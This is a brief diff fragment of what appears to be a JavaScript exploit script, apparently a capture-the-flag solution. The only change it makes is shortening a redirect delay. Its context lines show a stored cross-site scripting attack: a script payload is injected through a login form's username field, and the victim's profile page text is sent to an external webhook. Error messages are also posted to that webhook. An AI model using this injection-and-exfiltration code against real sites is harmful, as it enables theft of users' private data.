@@ -31,7 +31,7 @@ window.location = "${WEBHOOK}?" + profile.document.body.innerText;
   document.getElementById("username").value = `<script>${payload}</script>`;
   document.getElementById("login").submit();
 
-  setTimeout(() => (window.location = PROFILE), 4000);
+  setTimeout(() => (window.location = PROFILE), 3000);
 } catch (error) {
   post(WEBHOOK, `Error ${id}: ${error}`);
 }
